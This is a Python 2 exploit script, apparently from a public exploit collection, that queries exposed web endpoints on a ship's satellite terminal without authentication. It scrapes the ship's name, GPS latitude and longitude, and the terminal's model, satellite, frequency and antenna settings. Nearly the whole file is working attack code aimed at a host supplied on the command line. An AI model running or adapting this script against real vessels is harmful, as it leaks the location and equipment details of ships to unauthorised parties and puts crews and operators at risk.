# -*- coding: utf-8 -*- 
import sys
import json
import requests
import argparse
from BeautifulSoup import BeautifulSoup

class Colors:
    BLUE 		= '\033[94m'
    GREEN 		= '\033[32m'
    RED 		= '\033[0;31m'
    DEFAULT		= '\033[0m'
    ORANGE 		= '\033[33m'
    WHITE 		= '\033[97m'
    BOLD 		= '\033[1m'
    BR_COLOUR 	= '\033[1;37;40m'


details = ''' 
 # Exploit Title: exposed ship 
 # Date: 22/11/2017
 # Exploit Author: Fernandez Ezequiel ( @capitan_alfa )


'''
bannerX = '''\n



			.  o ..
			o . o o.o
			  ...oo
			    __[]__
			 __|_o_o_o\__
		  	 \\""""""""""/
			  \. ..  . /
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Powered By: @capitan_alfa 

\n'''

print bannerX
parser = argparse.ArgumentParser(prog='seaTel.py',
								description=' [+] Where are you ship ?', 
								epilog=' usr@pwn:~$ python seaTel.py --host <host>\n',
								version="1.2")

parser.add_argument('--host', 	dest="HOST",  	help='Host',	required=True)
parser.add_argument('--port', 	dest="PORT",  	help='Port (default 80)',	default=80)

args	= 	parser.parse_args()

HST   	= 	args.HOST
port 	= 	args.PORT

headers = {}

statSystem  =		"cgi-bin/getSysStatus"
statSat 	= 		"cgi-bin/getHeadBarStatus"

host 		= 	"http://"+HST+":"+str(port)+"/"

def makeReqHeaders():
	headers["Host"] 			=  host
	headers["User-Agent"]		= "Morzilla/7.0 (911; Pinux x86_128; rv:9743.0)"
	headers["Accept"] 			= "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" 
	headers["Accept-Languag"] 	= "es-AR,en-US;q=0.7,en;q=0.3"
	headers["Connection"] 		= "close"
	headers["Content-Type"] 	= "text/html"
	
	return headers

def getVersion():
	uriAnt = host+"PositionAnt.html"
	#print "\n [+] GET to: "+ uriAnt

	webSeatel = requests.get(uriAnt, headers=makeReqHeaders())

	respWebSeatel = BeautifulSoup(webSeatel.text)
	htmlInputs = respWebSeatel.findAll("input")

	return str(htmlInputs[32].get("value")),str(htmlInputs[33].get("value"))

def getNameShip():
	uriAnt = host+"MenuDealerGx.html"

	webSeatel = requests.get(uriAnt, headers=makeReqHeaders())
	respWebSeatel = BeautifulSoup(webSeatel.text)

	htmltables = respWebSeatel.findAll("td", {"class": "headbarmd"})[1].text

	
	shnm = str(htmltables).replace("Ship Name: ","")
	
	return shnm


r1 = requests.get(host+statSystem, headers=makeReqHeaders())
r2 = requests.get(host+statSat, headers=makeReqHeaders())

ststSys = (r1.text).split(";")
ststSat = (r2.text).split(";")

print "\n"
print Colors.GREEN+" [+] SHIP"+Colors.DEFAULT

shipName = getNameShip()

print "     Name:\t\t\t"			+shipName
print "     Latitude:\t\t\t"			+ststSys[5].replace("lat=","")
print "     Longitude:\t\t\t"		+ststSys[6].replace("lon=","")
print "\n"
print Colors.GREEN+" [+] SATELLITE TERMINAL"+Colors.DEFAULT

termVersion = getVersion()
termName 	= termVersion[0]
termModel 	= termVersion[1]



print "     Name:\t\t\t"+termName
print "     Model:\t\t\t"+termModel
	
print "     Satellite:\t\t\t"		+ststSys[9].replace("snm=","[snm?] ")
print "     Frecuency:\t\t\t"		+ststSys[12].replace("frq=","")
print "     Search Pattern:\t\t"	+ststSys[16].replace("sptn=","")

print "     Antenna:\t\t\t"			+ststSys[17].replace("ant=","")
print "     LNB:\t\t\t"				+ststSys[18].replace("lnb=","")
print "     Modem RX:\t\t\t"		+ststSys[8].replace("gps=","[gps] ")


print "\n"

print Colors.GREEN+" [+] SATELLITE"+Colors.DEFAULT
print "     Signal:\t\t\t"		+str(ststSat[2]).replace("agc=","")#"( ? --> GET /cgi-bin/getSatAGC)"
print "     Sat Lon:\t\t\t"		+ststSys[10].replace("slon=","")+" "+ststSys[11].replace("ssp=","")
print "     Heading:\t\t\t"		+str(ststSat[4]).replace("hdg=","")
print "     Azimuth:\t\t\t"    	+str(ststSat[5]).replace("az=","")
print "     Elevation:\t\t\t"   +str(ststSat[6]).replace("el=","")
print "     Relative:\t\t\t"    +str(ststSat[8]).replace("rel=","")

print "\n"
